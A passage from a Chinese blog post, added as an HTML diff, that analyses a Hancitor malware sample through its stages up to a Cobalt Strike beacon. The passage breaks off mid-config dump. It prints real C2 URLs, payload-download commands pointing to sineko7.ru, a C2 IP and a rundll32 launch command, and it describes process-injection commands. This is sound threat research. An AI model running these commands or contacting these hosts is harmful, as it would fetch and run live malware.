@@ -1,0 +1,263 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="scr1pt"><title>2021-12-16-hancitor · scr1pt's blog</title><meta name="description" content="intro之前看过两个hancitor的样本，但是从现在看来做的都太简单了，而且当时的各方面知识也都不是很完善。于是找了2021.12.26日的样本重新做一次详尽的分析。
+
+如果有错误可以联系我
+qq：2466811523
+mail: &amp;#x32;&amp;#52;&amp;#x36;&amp;#x36;&amp;#56;&amp;#x3"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/scr1pt.jpg"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.1.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/scr1pt.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/scr1pt.jpg" style="width:200px;" alt="favicon"><h3 title=""><a href="/">scr1pt's blog</a></h3><div class="description"><p>my dear virus, please fuck me</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/scr1pt-kid"><i class="fa fa-github"></i></a></li><li><a href="mailto:2466811523@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=2466811523"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> scr1pt</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>2021-12-16-hancitor</a></h3></div><div class="post-content"><p><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>之前看过两个hancitor的样本，但是从现在看来做的都太简单了，而且当时的各方面知识也都不是很完善。于是找了2021.12.26日的样本重新做一次详尽的分析。</p>
+<blockquote>
+<p>如果有错误可以联系我</p>
+<p>qq：2466811523</p>
+<p>mail: <a href="mailto:&#x32;&#52;&#x36;&#x36;&#56;&#x31;&#49;&#x35;&#50;&#x33;&#x40;&#x71;&#113;&#x2e;&#x63;&#111;&#x6d;">&#x32;&#52;&#x36;&#x36;&#56;&#x31;&#49;&#x35;&#50;&#x33;&#x40;&#x71;&#113;&#x2e;&#x63;&#111;&#x6d;</a></p>
+</blockquote>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><blockquote>
+<p>md5: 9f09b1dd6235c28b091a7dbc9bcd9482<br>sha1: b7ac19b82e2f946e7cc047421875bbade3e880fd<br>sha256: 571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74</p>
+<p>vt: <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/details">https://www.virustotal.com/gui/file/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/details</a></p>
+<p>hybrid: <a target="_blank" rel="noopener" href="https://hybrid-analysis.com/sample/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/61bb60be5679f80b2921e45a">https://hybrid-analysis.com/sample/571cba0431acea4739c5248de1b1d33e76e995b3c7454f4d88d2785ade6fdf74/61bb60be5679f80b2921e45a</a></p>
+<p>Reference:</p>
+<p><a target="_blank" rel="noopener" href="http://blog.nsfocus.net/beaconeye-cs/">http://blog.nsfocus.net/beaconeye-cs/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.malware-traffic-analysis.net/2021/12/16/index.html">https://www.malware-traffic-analysis.net/2021/12/16/index.html</a></p>
+</blockquote>
+<h3 id="区块信息"><a href="#区块信息" class="headerlink" title="区块信息"></a>区块信息</h3><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220421160905565.png" alt="image-20220421160905565"></p>
+<h3 id="导入函数"><a href="#导入函数" class="headerlink" title="导入函数"></a>导入函数</h3><h4 id="kernel32-dll"><a href="#kernel32-dll" class="headerlink" title="kernel32.dll"></a>kernel32.dll</h4><p>导入了EnterCriticalSection,DeleteCriticalSection,Exitprocess,WriteFile，猜测存在文件操作行为，反调试行为。</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220421161324695.png" alt="image-20220421161324695"></p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220421161351659.png" alt="image-20220421161351659"></p>
+<h4 id="advapi-dll"><a href="#advapi-dll" class="headerlink" title="advapi.dll"></a>advapi.dll</h4><p>存在注册表操作函数</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220421161558623.png" alt="image-20220421161558623"></p>
+<h2 id="沙箱行为分析"><a href="#沙箱行为分析" class="headerlink" title="沙箱行为分析"></a>沙箱行为分析</h2><h3 id="网络行为"><a href="#网络行为" class="headerlink" title="网络行为"></a>网络行为</h3><p>沙箱中存在网络行为</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424145411025.png" alt="image-20220424145411025"></p>
+<h4 id="post"><a href="#post" class="headerlink" title="post"></a>post</h4><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424151443896.png" alt="image-20220424151443896"></p>
+<p>传的数据经过了加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DATA=R1VJRD0xMDQyMzA1MTAwMTU0MjczNTA4NCZCVUlMRD0xNjEyX21jeHBsa2pnJklORk89ODM1MTgwIEAgREVTS1RPUC03MTZUNzcxXGhhcmR6JkVYVD0mSVA9MTAyLjEyOS4xNDMuNjImVFlQRT0xJldJTj0xMC4wKHg2NCkA</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="注册表行为"><a href="#注册表行为" class="headerlink" title="注册表行为"></a>注册表行为</h3><p>设置了<code>HKU\S-1-5-21-575823232-3065301323-1442773979-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\[ProxyServer/ProxyEnable]</code>,http启用代理。</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220421170202661.png" alt="image-20220421170202661"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">46 00 00 00 04 01 00 00 03 00 00 00 14 00 00 00 65 78 74 72 61 63 74 6F 72 2E 70 72 6F 78 79 3A 38 30 38 30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 D0 5C 01 4D C1 D5 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>得到的主要信息为我们获得了代理服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">65 78 74 72 61 63 74 6F 72 2E 70 72 6F 78 79 3A 38 30 38 30</span><br><span class="line">extractor.proxy:8080</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/4283027/whats-the-format-of-the-defaultconnectionsettings-value-in-the-windows-registry">What’s the format of the DefaultConnectionSettings value in the Windows registry?</a></p>
+</blockquote>
+<p>regsvc32.exe</p>
+<p>可疑注册表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER_Classes\dllfile\AutoRegister</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\dllfile\AutoRegister</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424152518074.png" alt="image-20220424152518074"></p>
+<h3 id="进程行为"><a href="#进程行为" class="headerlink" title="进程行为"></a>进程行为</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%windir%\System32\svchost.exe -k WerSvcGroup</span><br><span class="line">wmiadap.exe /F /T /R</span><br><span class="line">&quot;c:\windows\system32\regsvr32.exe&quot; C:\Users\ADMINI~1\AppData\Local\Temp\b7ac19b82e2f946e7cc047421875bbade3e880fd.dll</span><br><span class="line">C:\Windows\system32\WerFault.exe -u -p 2088 -s 300</span><br><span class="line">&quot;c:\windows\system32\rundll32.exe&quot; C:\Users\ADMINI~1\AppData\Local\Temp\b7ac19b82e2f946e7cc047421875bbade3e880fd.dll, DllRegisterServer</span><br></pre></td></tr></table></figure>
+
+<h3 id="注册服务"><a href="#注册服务" class="headerlink" title="注册服务"></a>注册服务</h3><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424143052701.png" alt="image-20220424143052701"></p>
+<h3 id="Mutex"><a href="#Mutex" class="headerlink" title="Mutex"></a>Mutex</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Local\WERReportingForProcess2088</span><br><span class="line">Global\10443951-6e48-11ec-95c3-6c4b90457b65</span><br><span class="line">DBWinMutex</span><br></pre></td></tr></table></figure>
+
+<h3 id="Decoded-Config"><a href="#Decoded-Config" class="headerlink" title="Decoded Config"></a>Decoded Config</h3><blockquote>
+<p>{“Campaign Id”: “1612_mcxplkjg”, “C2 list”: [“<a target="_blank" rel="noopener" href="http://hiltustra.com/9/forum.php&quot;">http://hiltustra.com/9/forum.php&quot;</a>, “<a target="_blank" rel="noopener" href="http://corelince.ru/9/forum.php&quot;">http://corelince.ru/9/forum.php&quot;</a>, “<a target="_blank" rel="noopener" href="http://mernwel.ru/9/forum.php&quot;]%7D">http://mernwel.ru/9/forum.php&quot;]}</a></p>
+<p>from ZenBox</p>
+</blockquote>
+<h3 id="antiDebug"><a href="#antiDebug" class="headerlink" title="antiDebug"></a>antiDebug</h3><p>这里还不太清楚为什么这个regsvr32.exe会被识别为anti-debug</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424144202382.png" alt="image-20220424144202382"></p>
+<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424145455392.png" alt="image-20220424145455392"></p>
+<h3 id="行为图"><a href="#行为图" class="headerlink" title="行为图"></a>行为图</h3><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424145855421.png" alt="image-20220424145855421"></p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220424145626481.png" alt="image-20220424145626481"></p>
+<h2 id="反汇编分析"><a href="#反汇编分析" class="headerlink" title="反汇编分析"></a>反汇编分析</h2><p>导出函数DllRegisterServer如下</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425130446643.png" alt="image-20220425130446643"></p>
+<h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><p>导出函数的第一个函数为，这里可以看到<code>QueryPerformanceCounter</code>函数，是用于检测时间的函数</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425135412146.png" alt="image-20220425135412146"></p>
+<p><code>sub_1000786D</code>函数中调用了<code>SetUnhandledExceptionFilter</code>函数，一般用于引发异常的反调试，当引发异常后会跳转到TopLevelException</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425140009666.png" alt="image-20220425140009666"></p>
+<p>看看TopLevelExceptionFilter，应该是动态解密的数据。</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425135244692.png" alt="image-20220425135244692"></p>
+<ul>
+<li>QueryPerformanceCounter</li>
+<li>IsProcessorFeaturePresent</li>
+<li>SetUnhandledExceptionFilter</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/profileapi/nf-profileapi-queryperformancecounter">https://docs.microsoft.com/en-us/windows/win32/api/profileapi/nf-profileapi-queryperformancecounter</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-setunhandledexceptionfilter">https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-setunhandledexceptionfilter</a></p>
+<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>debug DllRegisterServer</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425130918278.png" alt="image-20220425130918278"></p>
+<p>在加密数据处打硬件访问断点然后运行后到达如下</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425153401093.png" alt="image-20220425153401093"></p>
+<p>这边已经开始对内存地址进行清零了，说明这段数据已经解密成功并存储到内存地址的某处了，我们直接打开内存布局，找到具有执行权限的内存区域</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425153612582.png" alt="image-20220425153612582"></p>
+<p>执行完后发现0xf00000（随机生成）区域处内存如下，此时可以dump出我们Stage2 payload</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425155004204.png" alt="image-20220425155004204"></p>
+<h2 id="Stage2-Payload"><a href="#Stage2-Payload" class="headerlink" title="Stage2 Payload"></a>Stage2 Payload</h2><h3 id="启动方式"><a href="#启动方式" class="headerlink" title="启动方式"></a>启动方式</h3><p>向本地发送10个ping数据包，并使用<code>rundll32.exe</code>执行<code>iff.bin</code>文件的导出函数<code>WCWGVXGWTDGAWLW</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c ping localhost -n 10 &amp;&amp; rundll32.exe iff.bin,WCWGVXGWTDGAWLW</span><br></pre></td></tr></table></figure>
+
+<h3 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h3><blockquote>
+<p>md5: c90ad5fe64f4f02fb1f77005f95161d6<br>sha1: def89402bbff6a694c0adc82ee0d937f0a02182c<br>sha256: 19a7b1957104c4c01958ff3be6cc6688c9d34f725180bd4cc7d1373228dfbbc8</p>
+</blockquote>
+<p>导出函数<code>WCWGVXGWTDGAWLW</code></p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425162446941.png" alt="image-20220425162446941"></p>
+<h4 id="sub-10001519"><a href="#sub-10001519" class="headerlink" title="sub_10001519"></a><code>sub_10001519</code></h4><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426143423341.png" alt="image-20220426143423341"></p>
+<h5 id="mw-sendHostConfigAndRead"><a href="#mw-sendHostConfigAndRead" class="headerlink" title="mw_sendHostConfigAndRead"></a><code>mw_sendHostConfigAndRead</code></h5><p>首先获取主机的各种信息包括系统、主机名、公网IP、系统位数,然后根据系统位数进行生成配置信息，并准备加密发送给远程主机。</p>
+<blockquote>
+<p>The <strong>DsEnumerateDomainTrusts</strong> function obtains domain trust data for a specified domain. </p>
+<p>关于域信任关系：在同一个域内,成员服务器根据Active Directory中的用户账号,可以很容易地把资源分配给域内的用户.但一个域的作用范围毕竟有限,有些企业会用到多个域,那么在多域环境下,我们该如何进行资源的跨域分配呢？也就是说,我们该如何把A域的资源分配给B域的用户呢？一般来说,我们有两种选择,一种是使用镜像账户.也就是说,我们可以在A域和B域内各自创建一个用户名和口令都完全相同的用户账户,然后在B域把资源分配给这个账户后,A域内的镜像账户就可以访问B域内的资源了</p>
+<p>红队通过收集域信任关系从而进行横向移动.通过调用DSEnumerateDomainTrusts() Win32 API,来进行枚举</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425163412862.png" alt="image-20220425163412862"></p>
+</blockquote>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426135038998.png" alt="image-20220426135038998"></p>
+<p>主机信息会通过base64加密，最后由网络行为发送到远程主机</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220425193018919.png" alt="image-20220425193018919"></p>
+<h6 id="mw-Internet"><a href="#mw-Internet" class="headerlink" title="mw_Internet"></a>mw_Internet</h6><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426135136434.png"></p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426135154090.png" alt="image-20220426135154090"></p>
+<h5 id="mwDecryptReadData"><a href="#mwDecryptReadData" class="headerlink" title="mwDecryptReadData"></a>mwDecryptReadData</h5><p>那么我们可以通过这段代码获得什么呢？也就是返回数据的解密方式</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426140528240.png" alt="image-20220426140528240"></p>
+<p>首先跳过前四个字节也就是<code>35 30 0d 0a</code>，然后首先进行base64解密，然后xor解密即可得到payload</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426140540839.png" alt="image-20220426140540839"></p>
+<p>我们解密一下malware-traffic中的流量包数据</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426140056032.png" alt="image-20220426140056032"></p>
+<h5 id="mw-commandList"><a href="#mw-commandList" class="headerlink" title="mw_commandList"></a>mw_commandList</h5><p>看到后面就会发现这几个字符没有参与加密，为传入的命令列表字符串。</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426143122263.png" alt="image-20220426143122263"></p>
+<h5 id="mw-judgeCommand"><a href="#mw-judgeCommand" class="headerlink" title="mw_judgeCommand"></a>mw_judgeCommand</h5><blockquote>
+<p>命令</p>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Detail</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>b:</strong></td>
+<td>Download and inject into svchost.exe</td>
+</tr>
+<tr>
+<td><strong>e:</strong></td>
+<td>Download and inject into running process</td>
+</tr>
+<tr>
+<td><strong>l:</strong></td>
+<td>Download shellcode and inject into svchost.exe or current process</td>
+</tr>
+<tr>
+<td><strong>r:</strong></td>
+<td>Download and inject into svchost.exe, check file its downloading</td>
+</tr>
+<tr>
+<td><strong>n:</strong></td>
+<td>Do not download (could be utilized as a check to see if victim still active)</td>
+</tr>
+</tbody></table>
+<p>但是2021.12.16日这个样本中多了一条命令f</p>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Detail</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>b:</strong></td>
+<td>Download and inject into svchost.exe</td>
+</tr>
+<tr>
+<td><strong>e:</strong></td>
+<td>Download and inject into running process</td>
+</tr>
+<tr>
+<td><strong>l:</strong></td>
+<td>Download shellcode and inject into svchost.exe or current process</td>
+</tr>
+<tr>
+<td><strong>r:</strong></td>
+<td>Download and inject into svchost.exe, check file its downloading</td>
+</tr>
+<tr>
+<td><strong>n:</strong></td>
+<td>Do not download (could be utilized as a check to see if victim still active)</td>
+</tr>
+<tr>
+<td><strong>f:</strong></td>
+<td>Download the shellcode,infect into the svchost.exe or the running process.(start a thread that inherit the object handle,then inject into the shellcode)</td>
+</tr>
+</tbody></table>
+</blockquote>
+<h6 id="command-n"><a href="#command-n" class="headerlink" title="command n"></a>command n</h6><p>Do not download (could be utilized as a check to see if victim still active)</p>
+<h6 id="command-b"><a href="#command-b" class="headerlink" title="command b"></a>command b</h6><p>Download and inject into svchost.exe</p>
+<ul>
+<li>heapAlloc</li>
+<li>getPayload</li>
+</ul>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426150058134.png" alt="image-20220426150058134"></p>
+<h6 id="command-e-l"><a href="#command-e-l" class="headerlink" title="command e,l"></a>command e,l</h6><p>e:Download and inject into running process</p>
+<p>l:Download shellcode and inject into svchost.exe or current process</p>
+<ul>
+<li>heapAlloc</li>
+<li>getPayload</li>
+</ul>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426150629206.png" alt="image-20220426150629206"></p>
+<h6 id="command-f"><a href="#command-f" class="headerlink" title="command f"></a>command f</h6><ul>
+<li><p>HeapAlloc</p>
+</li>
+<li><p>getPayload</p>
+</li>
+</ul>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426150811588.png" alt="image-20220426150811588"></p>
+<h6 id="command-r"><a href="#command-r" class="headerlink" title="command r"></a>command r</h6><p>Download and inject into svchost.exe, check file its downloading</p>
+<ul>
+<li><p>HeapAlloc</p>
+</li>
+<li><p>getPayload</p>
+</li>
+</ul>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426151343946.png" alt="image-20220426151343946"></p>
+<h6 id="command-f-1"><a href="#command-f-1" class="headerlink" title="command f"></a>command f</h6><p>我们看一下这里f传入了<code>HANDLE_FLAG_INHERIT</code>参数</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426124924383.png" alt="image-20220426124924383"></p>
+<p>这意味着会创建一个继承了父进程对象handle的子进程</p>
+<table>
+<thead>
+<tr>
+<th align="left">Value</th>
+<th align="left">Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>HANDLE_FLAG_INHERIT</strong>0x00000001</td>
+<td align="left">If this flag is set, a child process created with the <em>bInheritHandles</em> parameter of <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcess</a> set to <strong>TRUE</strong> will inherit the object handle.</td>
+</tr>
+</tbody></table>
+<p>主要代码逻辑在<code>sub_10002A0B</code>函数里</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426125918651.png" alt="image-20220426125918651"></p>
+<p>首先check一下hProcess也就是<code>HANDLE_FLAG_INHERIT</code>，该参数默认值为1，如果不存在的话就通过线程的方式启动shellcode，存在的话就以代码注入的方式启动。</p>
+<blockquote>
+<p>这里代码设定死了参数，也就是这里只会以代码注入svchost.exe的方式启动</p>
+</blockquote>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426151117849.png" alt="image-20220426151117849"></p>
+<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>配置文件仍然使用sha1和rc4加密，前8byte用sha1加密，然后使用rc4解密pbData即可</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220428112736032.png" alt="image-20220428112736032"></p>
+<p>decrypt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1612_mcxplkjg...http://hiltustra.com/9/forum.php|http://corelince.ru/9/forum.php|http://mernwel.ru/9/forum.php|</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220428123831330.png" alt="image-20220428123831330"></p>
+<h2 id="Stage3-Payload"><a href="#Stage3-Payload" class="headerlink" title="Stage3 Payload"></a>Stage3 Payload</h2><p>那么第二阶段的payload也分析完毕了，我们看看第三阶段的payload会执行什么操作呢？首先我们得先提取出第三阶段的payload,上面说到我们已经提取出了流量中我们得到的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;f:http://sineko7.ru/37s.bin&#125;&#123;f:http://sineko7.ru/37.bin&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后shellcode加载可以断到<code>InternetConnectA</code>函数,C2的Ip地址为<code>104.128.232.37</code></p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220426202435662.png" alt="image-20220426202435662"></p>
+<p>这段shellcode的伪代码，是<strong>Metasploit</strong>的动态函数的混淆方式，利用hashdb恢复函数逻辑</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427153630325.png" alt="image-20220427153630325"></p>
+<p>然后shellcode的代码逻辑如下</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427172330409.png" alt="image-20220427172330409"></p>
+<p>通过<code>HttpRequestA</code>访问<code>104.128.232.37/bfGM</code></p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427112022448.png" alt="image-20220427112022448"></p>
+<p><code>HttpSendRequestA</code>发送请求，然后如果请求成功后会用<code>InternetReadFile</code>去读取下一阶段的payload</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427112238919.png" alt="image-20220427112238919"></p>
+<p>然后会发现shellcode大部分相同，只是访问的URL修改为了&#x2F;TdSQ.</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/%E6%88%AA%E5%B1%8F2022-04-27%2017.47.19.png" alt="截屏2022-04-27 17.47.19"></p>
+<h2 id="Stage4-Payload"><a href="#Stage4-Payload" class="headerlink" title="Stage4 Payload"></a>Stage4 Payload</h2><p>经调试发现如下代码动调解密了后面的代码</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427183907285.png" alt="image-20220427183907285"></p>
+<p>执行完后会发现Dos Stub头,我们可以dump出PE文件</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427184002914.png" alt="image-20220427184002914"></p>
+<h2 id="Stage5-Payload"><a href="#Stage5-Payload" class="headerlink" title="Stage5 Payload"></a>Stage5 Payload</h2><p>函数入口位于导出函数<code>ReflectiveLoader</code>，是beacon.dll的导出函数</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220427184816791.png" alt="image-20220427184816791"></p>
+<p>用PE-bear打开发现确实是beacon.dll</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220428094738533.png" alt="image-20220428094738533"></p>
+<p>由于beacon对配置的异或密钥是固定的，我们可以直接通过cyberchef对beacon提取c2（3.x版本的CobaltStrike默认是0x69，对4.x版本的CobalStrike默认是0x2e）</p>
+<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220428095422065.png" alt="image-20220428095422065"></p>
+<p>利用脚本提取config，虽然这里显示有已知的私钥，但经过尝试发现无法解密cs流量的cookie。猜测私钥错误。由于私钥没有泄漏导致cookie和后面的命令无法解密。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">File: loader_009E0000.bin</span><br><span class="line">payloadType: 0x10015044</span><br><span class="line">payloadSize: 0x00000000</span><br><span class="line">intxorkey: 0x00000000</span><br><span class="line">id2: 0x00000000</span><br><span class="line">Config found: xorkey b&#x27;.&#x27; 0x00030620 0x00032ec2</span><br><span class="line">0x0001 payload type                     0x0001 0x0002 0 windows-beacon_http-reverse_http</span><br><span class="line">0x0002 port                             0x0001 0x0002 